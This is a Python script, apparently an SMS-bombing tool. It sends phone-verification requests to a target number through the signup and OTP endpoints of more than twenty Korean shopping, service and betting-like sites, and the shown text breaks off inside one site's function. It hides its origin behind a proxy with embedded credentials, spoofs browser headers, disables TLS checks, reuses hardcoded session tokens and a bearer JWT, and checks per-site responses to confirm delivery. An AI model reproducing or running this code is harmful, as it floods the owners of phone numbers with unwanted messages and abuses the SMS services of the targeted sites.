# sms_worker.py
import requests
import re
import time
import sqlite3
import base64
import random
import uuid
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/153.0.0.0 Safari/537.36"
)

PROXY_URL = "http://np_91jruyggx3-country-KR:w4rf4Nfa8IE9Iqgb@global.nodeproxies.xyz:8080"
PROXY = {
    "http": PROXY_URL,
    "https": PROXY_URL,
}


def _session():
    s = requests.Session()
    s.proxies.update(PROXY)
    s.verify = False
    return s


def _get(url, **kwargs):
    kwargs.setdefault("proxies", PROXY)
    kwargs.setdefault("verify", False)
    return requests.get(url, **kwargs)


def _post(url, **kwargs):
    kwargs.setdefault("proxies", PROXY)
    kwargs.setdefault("verify", False)
    return requests.post(url, **kwargs)


def mask_phone(phone: str) -> str:
    d = re.sub(r"\D", "", phone)
    if len(d) >= 7:
        return d[:3] + "*" * (len(d) - 7) + d[-4:]
    if len(d) > 3:
        return d[:3] + "*" * (len(d) - 3)
    return d


def normalize_phone(raw: str):
    digits = re.sub(r"\D", "", raw)
    if len(digits) == 11:
        hyphen = f"{digits[:3]}-{digits[3:7]}-{digits[7:]}"
    elif len(digits) == 10:
        hyphen = f"{digits[:3]}-{digits[3:6]}-{digits[6:]}"
    else:
        hyphen = raw
    return digits, hyphen


def split_phone(raw: str):
    d = re.sub(r"\D", "", raw)
    if len(d) == 11:
        return d[:3], d[3:7], d[7:]
    if len(d) == 10:
        return d[:3], d[3:6], d[6:]
    return d, "", ""


def is_success(name, status, body):
    if status != 200:
        return False

    b = body.lower()
    fail_markers = [
        '"result":"fail"', '"result": "fail"',
        '"result":false', '"result": false',
        '"code":500', '"code": 500',
        '잘못된 접근', '실패', 'error', 'exception',
    ]
    for k in fail_markers:
        if k in b:
            return False

    if name == "peachmarket" and body.strip() == "0":
        return False
    if name == "ba-ro":
        return '"status": 1' in b or '"status":1' in b
    if name == "evplug":
        return '"result":"success"' in b or '"result": "success"' in b
    if name in ("busmall-via-cafe24", "allfresh-via-cafe24"):
        return ('"sresultcode":"0000"' in b
                or '"issendmobilesms":true' in b
                or '"issendmobilesms": true' in b)
    if name == "cr-333":
        return '"code": 200' in b or '"code":200' in b
    if name == "bizzle":
        return '"result": "success"' in b or '"result":"success"' in b
    if name == "e-ncp":
        return '"remaintime"' in b
    if name == "oasis":
        return '"status":"ok"' in b or '"status": "ok"' in b
    if name == "8dogam":
        return '"verifyingtoken"' in b
    if name in ("jikfarm", "santafarmer"):
        return '"result": "ok"' in b or '"result":"ok"' in b
    if name == "duranno":
        return '"tel" : "t"' in b or '"tel":"t"' in b
    if name == "mggoon":
        return '"result": "ok"' in b or '"result":"ok"' in b
    if name == "le-go":
        return ('인증문자가 발송되었습니다' in body
                or ('"msg"' in b and 'crypt' in b))
    if name == "smtb-0042":
        return '"crypt"' in b and ('인증되었습니다' in body or '"msg"' in b)
    if name == "oeo2330":
        return body.strip() == "200"
    if name == "mbest":
        return ('인증번호가 카카오 알림톡' in body
                or '전송되었습니다' in body
                or ('setconfirmcheck' in b and 'var c = 1' in b)
                or ('setconfirmcheck' in b and 'var c=1' in b))
    if name == "pdpd008":
        return ('"result": true' in body
                or '"message": "인증번호가 전송되었습니다."' in body
                or '인증번호가 전송되었습니다' in body)
    if name == "tkdcon":
        flat = b.replace(" ", "")
        return ('"success":true' in flat
                or '전송이 완료되었습니다' in body
                or '카카오톡 또는 문자앱을 확인' in body)
    if name == "ingang":
        flat = b.replace(" ", "")
        return ('"resultcode":"ok"' in flat
                or '인증번호 입력 후 인증하기' in body)
    if name == "jnoble":
        return ('인증번호는' in body
                or ('smscheck2' in b and "'block'" in b)
                or ('smscheck2' in b and '"block"' in b))
    if name == "purples":
        return body.strip() == "111111"
    if name == "thirtymall-e-ncp":
        return '"remaintime"' in b
    if name == "attrangs":
        return ('인증번호가 발송되었습니다' in body
                or 'data-phone' in b
                or 'phone_chk_area' in b)
    if name == "dg-9284":
        flat = b.replace(" ", "")
        return '"result":true' in flat
    return True


def send_evplug(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://evplug.co.kr",
            "Referer": "https://evplug.co.kr/",
        }
        r = _post(
            "https://api.evplug.co.kr/api/v1/users/authCode",
            json={"ty": "AUTH", "phone": digits},
            headers=h, timeout=10,
        )
        return ("evplug", r.status_code, r.text[:400])
    except Exception as e:
        return ("evplug", "EXC", str(e))


def send_peachmarket(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://peachmarket.kr/register/", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://peachmarket.kr/",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://peachmarket.kr",
            "Referer": "https://peachmarket.kr/register/",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://peachmarket.kr/wp-admin/admin-ajax.php",
            data={"action": "send_verification_code", "billing_phone": hyphen},
            headers=h, timeout=10,
        )
        return ("peachmarket", r.status_code, r.text[:400])
    except Exception as e:
        return ("peachmarket", "EXC", str(e))


def send_genimarket(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://www.genimarket.co.kr/", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.genimarket.co.kr",
            "Referer": "https://www.genimarket.co.kr/",
            "X-Requested-With": "XMLHttpRequest",
        }
        r = s.post(
            "https://www.genimarket.co.kr/_ajax/member/memberAsync.php",
            data={"cmd": "phone_certify_check_send", "phone_number": digits},
            headers=h, timeout=10,
        )
        return ("genimarket", r.status_code, r.text[:400])
    except Exception as e:
        return ("genimarket", "EXC", str(e))


def send_busmall(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://busmall.co.kr/member/join.html", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://busmall.co.kr/",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://busmall.co.kr",
            "Referer": "https://busmall.co.kr/member/join.html",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://busmall.co.kr/exec/front/member/ApiAuthsms",
            data={"mobile1": m1, "mobile2": m2, "mobile3": m3},
            headers=h, timeout=10,
        )
        return ("busmall", r.status_code, r.text[:400])
    except Exception as e:
        return ("busmall", "EXC", str(e))


def _cafe24_flow(digits, hyphen, m1, m2, m3, referer, join_url, api_url, name):
    try:
        auth_string = '{"joinForm::mobile1":"' + m1 + '","joinForm::mobile2":"' + m2 + '","joinForm::mobile3":"' + m3 + '"}'

        params = {
            "auth_mode": "encrypt",
            "auth_callbackName": "memberVerifyMobile.sendVerificationNumberEncryptResult",
            "auth_string": auth_string,
            "dummy": str(int(time.time() * 1000)),
        }
        h1 = {
            "User-Agent": USER_AGENT,
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": referer,
            "Sec-Fetch-Dest": "script",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Storage-Access": "active",
        }
        r1 = _get(
            "https://login2.cafe24ssl.com/crypt/AuthSSLManagerV2.php",
            params=params, headers=h1, timeout=10,
        )

        m = re.search(
            r"sendVerificationNumberEncryptResult\(\s*['\"]([^'\"]+)['\"]\s*\)",
            r1.text,
        )
        if not m:
            return (name, "FAIL", "encrypted_str 추출 실패")

        encrypted_str = m.group(1)

        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get(join_url, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": referer,
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h2 = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": referer.rstrip("/"),
            "Referer": join_url,
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r2 = s.post(api_url, data={"encrypted_str": encrypted_str}, headers=h2, timeout=10)
        return (name, r2.status_code, r2.text[:500])
    except Exception as e:
        return (name, "EXC", str(e))


def send_busmall_via_cafe24(digits, hyphen, m1, m2, m3):
    return _cafe24_flow(
        digits, hyphen, m1, m2, m3,
        referer="https://busmall.co.kr/",
        join_url="https://busmall.co.kr/member/join.html",
        api_url="https://busmall.co.kr/exec/front/member/ApiAuthsms",
        name="busmall-via-cafe24",
    )


def send_allfresh_via_cafe24(digits, hyphen, m1, m2, m3):
    return _cafe24_flow(
        digits, hyphen, m1, m2, m3,
        referer="https://allfresh.co.kr/",
        join_url="https://allfresh.co.kr/member/join.html",
        api_url="https://allfresh.co.kr/exec/front/member/ApiAuthsms",
        name="allfresh-via-cafe24",
    )


def send_ba_ro(digits, hyphen, m1, m2, m3):
    try:
        session_json = (
            '{"member":"84Fr7noPpnT826V3PyJVOe6b3YVRAaxmHR0k6Wl1ufRnhJTiE9JjjrJaAYfYYESfp5gGDkbUyS/7/zkpF2lVMihDooILwMyCIfysd+dmsvk=",'
            '"browser":"eecc50e4f4d8940f0fd902a0c5c35627",'
            '"session":"69be48cf6a3f4a96"}'
        )
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://bar0.bet",
            "Referer": "https://bar0.bet/",
            "Lang": "ko",
            "Session": session_json,
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        r = _post(
            "https://api.ba-ro.bet/verify",
            json={"userid": None, "tel_number": digits, "namespace": "user-create"},
            headers=h, timeout=10,
        )
        return ("ba-ro", r.status_code, r.text[:400])
    except Exception as e:
        return ("ba-ro", "EXC", str(e))


def send_cr_333(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://cr-333.com",
            "Referer": "https://cr-333.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = _post(
            "https://cr-333.com/api/sms/send",
            json={"phone": digits},
            headers=h, timeout=10,
        )
        return ("cr-333", r.status_code, r.text[:400])
    except Exception as e:
        return ("cr-333", "EXC", str(e))


def send_bizzle(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://bizzle.smartro.co.kr",
            "Referer": "https://bizzle.smartro.co.kr/sLogin/celpSvcAgree.do?AUTO_LOGIN_FLAG=N&CookieDomain=bizzle.smartro.co.kr",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = _post(
            "https://bizzle.smartro.co.kr/login/smsAuthReq.do",
            data={"PHONE_NO": digits, "HASH_BYTE_CD": ""},
            headers=h, timeout=10,
        )
        return ("bizzle", r.status_code, r.text[:400])
    except Exception as e:
        return ("bizzle", "EXC", str(e))


def send_e_ncp(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://store.sony.co.kr",
            "Referer": "https://store.sony.co.kr/",
            "clientid": "jkEJfXWkjf3NDwFlgc37xQ==",
            "platform": "PC",
            "version": "1.0",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }
        r = _post(
            "https://shop-api.e-ncp.com/authentications/sms",
            json={"mobileNo": digits, "usage": "JOIN", "memberName": None},
            headers=h, timeout=10,
        )
        return ("e-ncp", r.status_code, r.text[:400])
    except Exception as e:
        return ("e-ncp", "EXC", str(e))


def send_oasis(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://m.oasis.co.kr/join/signUp", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Referer": "https://m.oasis.co.kr/",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "ajax": "true",
            "Origin": "https://m.oasis.co.kr",
            "Referer": "https://m.oasis.co.kr/join/signUp",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.get(f"https://m.oasis.co.kr/join/sendOtp/{digits}", headers=h, timeout=10)
        return ("oasis", r.status_code, r.text[:400])
    except Exception as e:
        return ("oasis", "EXC", str(e))


def send_8dogam(digits, hyphen, m1, m2, m3):
    try:
        h = {
            "User-Agent": USER_AGENT,
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://8dogam.com",
            "Referer": "https://8dogam.com/auth/sms-login?callbackUrl=/mypage",
            "Authorization": (
                "Bearer eyJhbGciOiJIUzI1NiJ9."
                "eyJqdGkiOiJiYzNmYTg3Ny1lMjg4LTQzZjUtYWViNi1kYmZhNGE2NDIwMTkiLCJpc3MiOiJzYW5qaS5yYXBwb3J0bGFicy5rcjp2MSIsImlhdCI6MTc5MDM0NTQ4NCwiZXhwIjoxNzkwMzQ5MDg0LCJ0eXBlIjoiQUNDRVNTIiwidWlkIjoidWlkXzM3YmIzYzg3MzcyMDExYTBjMzljN2U0ZDM1M2MzN2VmIiwidXNlclJvbGUiOiJBTk9OWU1PVVMiLCJpc1Rlc3RlciI6ZmFsc2V9."
                "ICLHxNMErScAnoHYZLEP0z6qbZ9s3RUZ6vzuDuCNaq8"
            ),
            "platform": "WEB",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }
        r = _post(
            "https://api.8dogam.com/web/verifications/sms",
            json={"phoneNumber": digits},
            headers=h, timeout=10,
        )
        return ("8dogam", r.status_code, r.text[:400])
    except Exception as e:
        return ("8dogam", "EXC", str(e))


def send_jikfarm(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://www.jikfarm.kr/Mypage/New_Join", params={
            "jointype": "6",
            "RefererURL": "/Mypage/Mobile_My_Index",
            "life_time_agree": "false",
        }, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Referer": "https://www.jikfarm.kr/Mypage/DormantJoinAgree?jointype=6&RefererURL=%2fMypage%2fMobile_My_Index",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://www.jikfarm.kr",
            "Referer": "https://www.jikfarm.kr/Mypage/New_Join?jointype=6&RefererURL=%2fMypage%2fMobile_My_Index&life_time_agree=false",
            "X-CSRFToken": "null",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://www.jikfarm.kr/Mypage/SendSmsTokenNum",
            json={"sc_type": "6", "sc_htel1": m1, "sc_htel2": m2, "sc_htel3": m3},
            headers=h, timeout=10,
        )
        return ("jikfarm", r.status_code, r.text[:400])
    except Exception as e:
        return ("jikfarm", "EXC", str(e))


def send_duranno(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://www.duranno.com/member/join/", params={
            "div": "0",
            "prepage": "https://www.duranno.com/subscribe",
        }, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.duranno.com",
            "Referer": "https://www.duranno.com/member/join/?div=0&prepage=https://www.duranno.com/subscribe",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://www.duranno.com/member/join/chk_authPhone1.asp",
            data={"phone": digits},
            headers=h, timeout=10,
        )
        return ("duranno", r.status_code, r.text[:400])
    except Exception as e:
        return ("duranno", "EXC", str(e))


def send_mggoon(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://mggoon.co.kr/Mypage/New_Join", params={
            "jointype": "5",
            "RefererURL": "",
            "life_time_agree": "false",
        }, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Referer": "https://mggoon.co.kr/Mypage/DormantJoinAgree?jointype=5&RefererURL=",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://mggoon.co.kr",
            "Referer": "https://mggoon.co.kr/Mypage/New_Join?jointype=5&RefererURL=&life_time_agree=false",
            "X-CSRFToken": "null",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://mggoon.co.kr/Mypage/SendSmsTokenNum",
            json={"sc_type": "5", "sc_htel1": m1, "sc_htel2": m2, "sc_htel3": m3},
            headers=h, timeout=10,
        )
        return ("mggoon", r.status_code, r.text[:400])
    except Exception as e:
        return ("mggoon", "EXC", str(e))


def send_santafarmer(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://www.santafarmer.com/Mypage/New_Join", params={
            "jointype": "5",
            "RefererURL": "",
            "life_time_agree": "false",
        }, headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
            "Referer": "https://www.santafarmer.com/Mypage/DormantJoinAgree?jointype=5&RefererURL=",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json; charset=UTF-8",
            "Origin": "https://www.santafarmer.com",
            "Referer": "https://www.santafarmer.com/Mypage/New_Join?jointype=5&RefererURL=&life_time_agree=false",
            "X-CSRFToken": "null",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://www.santafarmer.com/Mypage/SendSmsTokenNum",
            json={"sc_type": "5", "sc_htel1": m1, "sc_htel2": m2, "sc_htel3": m3},
            headers=h, timeout=10,
        )
        return ("santafarmer", r.status_code, r.text[:400])
    except Exception as e:
        return ("santafarmer", "EXC", str(e))


def send_le_go(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://le-go-1122.com/?code=881", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://le-go-1122.com",
            "Referer": "https://le-go-1122.com/?code=881",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://le-go-1122.com/sms/make_num",
            data={"hp1": m1, "hp2": m2, "hp3": m3},
            headers=h, timeout=10,
        )
        return ("le-go", r.status_code, r.text[:400])
    except Exception as e:
        return ("le-go", "EXC", str(e))


def send_smtb_0042(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://smtb-0042.com/", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://smtb-0042.com",
            "Referer": "https://smtb-0042.com/",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://smtb-0042.com/sms/make_num",
            data={"hp1": m1, "hp2": m2, "hp3": m3},
            headers=h, timeout=10,
        )
        return ("smtb-0042", r.status_code, r.text[:400])
    except Exception as e:
        return ("smtb-0042", "EXC", str(e))


def send_oeo2330(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })
        s.get("https://oeo2330.com/", headers={
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Upgrade-Insecure-Requests": "1",
        }, timeout=10)

        h = {
            "Accept": "*/*",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://oeo2330.com",
            "Referer": "https://oeo2330.com/",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        r = s.post(
            "https://oeo2330.com/sendSMS.asp",
            data={"phonenum": digits},
            headers=h, timeout=10,
        )
        return ("oeo2330", r.status_code, r.text[:400])
    except Exception as e:
        return ("oeo2330", "EXC", str(e))


def send_mbest(digits, hyphen, m1, m2, m3):
    try:
        import urllib.parse as _up

        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        s.get(
            "https://accounts.mbest.co.kr/memreg/join/mb_join_reg.asp",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Upgrade-Insecure-Requests": "1",
            },
            timeout=10,
        )

        name = "김민수"
        name_enc = _up.quote(_up.quote(name))
        mem_name = _up.quote(name)

        inner = (
            "searchGbn=jumin&gbn=hp&o=cell&mode="
            "&blnRcvM=0&blnRcvS=1&ipin_run=0&ipin_name=&ipin_overap="
            f"&mem_name_enc={name_enc}"
            "&server_name=accounts.mbest.co.kr&branch_key=0&find_gbn=id"
            "&p=&d=P"
            "&isConfGbn_cell=0&isConfGbn_email=0"
            "&confirmKey_cell=&confirmKey_email="
            "&encRstCode_cell=&encRstCode_email="
            "&siteFlag=1&is_mobile=False"
            f"&mem_hp1={m1}&mem_hp2={m2}&mem_hp3={m3}"
            "&mem_status=5&mb_chk01=1&mb_chk02=1"
            "&ori_key=&enc_key="
            "&agree_14=0&agree_entrust=1&memreg_location=jumin"
            "&mem_jumin1=&mem_jumin2=&inputClick=0"
            "&mem_megajoin=0&mega_chk1=0&mega_chk2=0&mega_chk3=0"
            "&mbest_chk1=1&mbest_chk2=1&mbest_chk4=1&mbest_chk7=1"
            "&mbest_chk8=0&mbest_chk6=1"
            "&mem_sms_flg=0&mem_email_flg=0&sms_Auth=0&c_joinFlag=0"
            "&access_code=&mem_email=&mem_kakao_flg=1&name="
            f"&mem_name={mem_name}"
            f"&mem_hp_sub={m1}{m2}{m3}"
            "&confirm_num_cell=&mem_email_front=&mem_email_etc="
            "&mem_email_middle=&confirm_num_email="
        )

        penc = base64.b64encode(inner.encode("utf-8")).decode("ascii")

        h1 = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://accounts.mbest.co.kr",
            "Referer": "https://accounts.mbest.co.kr/memreg/join/mb_join_reg.asp",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "iframe",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        r1 = s.post(
            "https://accounts.mbest.co.kr/mem_confirm/utf8/id_search_confirm_all.asp",
            data={"penc": penc},
            headers=h1, timeout=10,
        )

        m = re.search(r'name="ctoken"\s+value="([^"]+)"', r1.text)
        if not m:
            return ("mbest", r1.status_code, "ctoken 추출 실패: " + r1.text[:200])
        ctoken = m.group(1)

        h2 = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://accounts.mbest.co.kr",
            "Referer": "https://accounts.mbest.co.kr/mem_confirm/utf8/id_search_confirm_all.asp",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "iframe",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
        }
        r2 = s.post(
            "https://accounts.mbest.co.kr/inc_common/memfind/utf8/confirm_result_all.asp",
            data={"ctoken": ctoken},
            headers=h2, timeout=10,
        )
        return ("mbest", r2.status_code, r2.text[:400])
    except Exception as e:
        return ("mbest", "EXC", str(e))


def send_pdpd008(digits, hyphen, m1, m2, m3):
    try:
        s = _session()
        s.headers.update({
            "User-Agent": USER_AGENT,
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        })

        h = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": "https://pdpd008.com/",
        }
        r = s.get(
            f"https://pdpd008.com/send_sms.asp?phone={digits}",
            headers=h, timeout=10,
        )
        return ("pdpd008", r.status_code, r.text[:400])
    except Exception as e:
        return ("pdpd008", "EXC", str(e))


def send_tkdcon(digits, hyphen, m1, m2, m3):
    try:
